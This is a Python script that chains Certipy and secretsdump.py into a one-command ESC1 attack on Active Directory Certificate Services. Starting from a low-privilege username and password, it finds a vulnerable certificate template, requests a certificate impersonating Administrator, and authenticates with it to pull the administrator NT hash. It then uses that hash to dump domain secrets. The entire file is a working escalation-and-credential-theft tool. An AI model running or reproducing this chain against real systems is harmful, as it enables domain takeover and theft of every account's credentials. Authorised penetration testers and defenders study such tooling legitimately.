import subprocess
import re
import argparse
from rich.console import Console
from rich.panel import Panel

console = Console()

def run_certipy_find(user, password, target):
    console.print("[+] Enumerating certificate templates...", style="bold green")
    command = [
        "certipy", "find",
        "-u", user,
        "-p", password,
        "-target", target,
        "-enabled",
        "-stdout",
        "-vulnerable"
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[!] Error running Certipy find: {result.stderr}")
        return None
    return result.stdout


def parse_certipy_find_output(output):
    console. print("[+] Certipy Findings...", style="bold green")
    vulnerable_to = re.search(r"\[!\] Vulnerabilities\s+(.*)", output, re.S)
    template_name = re.search(r"Template Name\s+: (.+)", output)
    ca_name = re.search(r"CA Name\s+: (.+)", output)

    vulnerabilities = vulnerable_to.group(1).strip() if vulnerable_to else "N/A"
    template_name = template_name.group(1).strip() if template_name else "N/A"
    ca_name = ca_name.group(1).strip() if ca_name else "N/A"

    message = (
    	f"[bold red][*] Vulnerable Template:[/bold red] {template_name}\n"
    	f"[bold red][*] CA Name:[/bold red] {ca_name}\n"
    	f"[bold red][*] Vulnerabilities:[/bold red] {vulnerabilities}"
    )
    console.print(Panel(message, title="[bold red]Certipy Findings[/bold red]", border_style="red"))
    parsed_data = {
        "vulnerabilities": vulnerabilities,
        "template_name": template_name,
        "ca_name": ca_name
    }
    return parsed_data


def run_certipy_request(user, password, ca, template, upn, target, output_file):
    console.print("[+] Requesting a certificate as Administrator...", style="bold cyan")
    command = [
        "certipy", "req",
        "-u", user,
        "-p", password,
        "-ca", ca,
        "-template", template,
        "-upn", upn,
        "-target", target, "-debug"
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"[!] Error running Certipy req: {result.stderr}")
        return None
    
    message = f"[bold green]{result.stdout}[/bold green]"
    console.print(Panel(message, title="[bold green]Certipy Request Output[/bold green]", border_style="green"))
    
    return output_file

def run_certipy_auth(pfx_file, domain):
    console.print("[+] Authenticating with the pfx file...", style="bold cyan")
    command = [
        "certipy", "auth",
        "-pfx", pfx_file,
        "-domain", domain
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"[!] Error running Certipy auth: {result.stderr}")
        return None
    
    message = f"[bold cyan]{result.stdout}[/bold cyan]"
    console.print(Panel(message, title="[bold cyan]Certipy Authentication Output[/bold cyan]", border_style="cyan"))
    
    return result.stdout

def extract_nt_hash(certipy_output):
    match = re.search(r"Got hash for 'administrator@.+': ([a-f0-9]+):([a-f0-9]+)", certipy_output)
    if match:
        full_hash = f"{match.group(1)}:{match.group(2)}"
        console.print(f"[*] Extracted NT Hash: {full_hash}", style="bold cyan")
        return full_hash
    else:
        print("[!] NT hash not found in Certipy output.")
        return None


def run_secretsdump(user, ntlm_hash, target):
    console.print(f"[+] Running secretsdump.py with NTLM hash: {ntlm_hash}", style="bold red")
    command = [
        "secretsdump.py",
        f"{user}@{target}",
        "-hashes", ntlm_hash
    ]

    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        while True:
            output = process.stdout.readline()
            if output == "" and process.poll() is not None:
                break
            if output:
                console.print(output.strip(), style="bold cyan")  

        stderr_output = process.stderr.read()
        if process.returncode != 0:
            console.print(f"[!] Error running secretsdump.py: {stderr_output.strip()}", style="bold cyan")  
        else:
            console.print("[+] secretsdump.py completed successfully.", style="bold red")  
    except Exception as e:
        console.print(f"[!] Exception occurred: {e}", style="red")  

def main():
    parser = argparse.ArgumentParser(description="ESC1 exploitation using Certipy in no time : D")
    parser.add_argument("-u", "--username", required=True, help="Username (e.g., user@domain)")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-t", "--target", required=True, help="Target domain")
    args = parser.parse_args()

    user = args.username
    password = args.password
    target = args.target

    find_output = run_certipy_find(user, password, target)
    if not find_output:
        return

    parsed_data = parse_certipy_find_output(find_output)
    template = parsed_data["template_name"]
    ca = parsed_data["ca_name"]

    output_file = "administrator.pfx"
    cert_output = run_certipy_request(user, password, ca, template, "Administrator", target, output_file)
    if not cert_output:
        return

    auth_output = run_certipy_auth(output_file, target)
    if not auth_output:
        return

    nt_hash = extract_nt_hash(auth_output)
    if not nt_hash:
        return

    run_secretsdump("Administrator", nt_hash, target)


if __name__ == "__main__":
    main()
